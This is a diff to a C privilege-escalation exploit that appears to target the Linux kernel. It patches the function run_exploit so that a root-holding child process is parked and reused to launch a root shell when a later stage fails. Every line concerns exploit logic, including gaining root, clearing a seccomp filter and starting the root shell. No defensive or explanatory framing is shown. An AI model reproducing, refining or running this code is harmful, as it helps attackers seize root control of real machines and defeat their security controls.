@@ -979,6 +979,9 @@ int run_exploit(int argc, char **argv) {
   uintptr_t child_task = 0;
   int child_alive = 1;
   int seccomp_ok = 0;
+  int ever_rooted = 0;
+  pid_t parked_child = -1;
+  int parked_cmd_w = -1;
 
   /* W2+W3 as a retryable chain: a missed W3 write or probe can kill the
    * child, so respawn and redo. */
@@ -988,8 +991,12 @@ int run_exploit(int argc, char **argv) {
       if (child > 0 && child_alive) {
         write(pipes.cmd_w, "P", 1);
         usleep(50000);
+        parked_child = child;
+        parked_cmd_w = pipes.cmd_w;
+      } else {
+        close(pipes.cmd_w);
       }
-      close(pipes.cmd_w); close(pipes.uid_r);
+      close(pipes.uid_r);
       child_alive = 1;
       seccomp_ok = 0;
     }
@@ -1062,9 +1069,10 @@ int run_exploit(int argc, char **argv) {
       write(pipes.cmd_w, "X", 1);
       close(pipes.cmd_w); close(pipes.uid_r);
       pr_warning("W2 failed after 15 rounds\n");
-      waitpid(child, NULL, 0);
+      waitpid(child, NULL, WNOHANG);
       return 1;
     }
+    ever_rooted = 1;
     /* rooted children never exit; chain failures park (P) */
 
     /* W3: clear the child's seccomp filter for the independent root shell
@@ -1144,16 +1152,24 @@ int run_exploit(int argc, char **argv) {
 
   sleep(2);
   TIMER("exploit complete");
+  if (!ever_rooted) {
+    pr_error("w2 never rooted a child\n");
+    return 1;
+  }
   if (child_alive) {
     if (write(pipes.cmd_w, "G", 1) != 1)
       pr_warning("failed to start root shell (child exited early)\n");
+    close(pipes.cmd_w);
+    waitpid(child, NULL, WNOHANG);
+    if (parked_cmd_w >= 0) close(parked_cmd_w);
+  } else if (parked_child > 0) {
+    if (write(parked_cmd_w, "G", 1) != 1)
+      pr_warning("failed to start root shell (parked child exited)\n");
+    close(parked_cmd_w);
+    waitpid(parked_child, NULL, WNOHANG);
+    parked_cmd_w = -1;
   } else {
     pr_warning("skipping late-load: child died during W3\n");
-  }
-  close(pipes.cmd_w);
-  /* park the child after forking the root shell */
-  if (child_alive) {
-    waitpid(child, NULL, WNOHANG);
   }
   close(pipes.uid_r);
 
